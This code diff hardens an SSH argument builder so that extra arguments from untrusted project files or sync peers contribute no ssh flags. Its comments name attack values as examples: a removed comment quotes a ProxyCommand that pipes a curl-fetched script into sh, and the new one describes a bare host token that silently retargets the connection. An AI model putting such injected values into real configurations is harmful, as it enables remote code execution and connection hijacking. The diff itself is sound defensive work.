@@ -161,9 +161,9 @@ export function sshHostKey(conn: Pick<SshConnection, 'host' | 'user'>): string {
  *
  * `extraArgs` is spliced in verbatim ONLY when the connection is `execTrusted` — i.e. the value
  * came from this machine (the user's SSH server store, or the machine-local workspace index). Any
- * other value has its exec-enabling options removed first: a `.nodeterm/project.json` from a cloned
- * repo, or a canvas-sync peer's node, must never be able to hand `/bin/sh` a command through
- * `-o ProxyCommand=…`. The connection is still attempted — degrade, never block.
+ * other value contributes NOTHING: a `.nodeterm/project.json` from a cloned repo, or a canvas-sync
+ * peer's node, must never be able to add ssh flags at all. The connection is still attempted —
+ * degrade, never block.
  */
 export function buildSshArgs(conn: SshConnection): string[] {
   const args = ['-p', String(conn.port ?? 22)]
@@ -171,14 +171,15 @@ export function buildSshArgs(conn: SshConnection): string[] {
   const extra = parseExtraArgs(conn.extraArgs)
   if (conn.execTrusted) {
     args.push(...extra)
-  } else {
-    // Untrusted AND exec-enabling → the WHOLE list is refused, not just the offending option.
-    // Dropping `-o ProxyCommand=curl` out of `-o ProxyCommand=curl evil.sh|sh` would leave the
-    // orphaned `evil.sh|sh` behind, and ssh reads the first positional argument as the DESTINATION.
-    // Shrapnel is not a safe degrade; no extra args is.
-    const { args: safe, dropped } = stripLocalExecArgs(extra)
-    args.push(...(dropped.length ? [] : safe))
   }
+  // else: an UNTRUSTED extraArgs contributes no tokens. `stripLocalExecArgs` removes the
+  // exec-enabling OPTIONS, but the survivors are still not safe to splice: a bare token
+  // (`evilhost`) has no exec option so it passes the strip with dropped=[], and ssh reads the
+  // first positional argument as the DESTINATION — silently retargeting the connection. Flags like
+  // `-A` (agent forwarding) or `-J` (jump host) from a document are unwanted too. An untrusted
+  // source has no legitimate need to add ssh args (this branch isn't even reached today —
+  // untrusted extraArgs is stripped upstream), so the empty list is the only safe degrade; there
+  // is no residue to reason about token by token.
   args.push(`${conn.user}@${conn.host}`)
   return args
 }
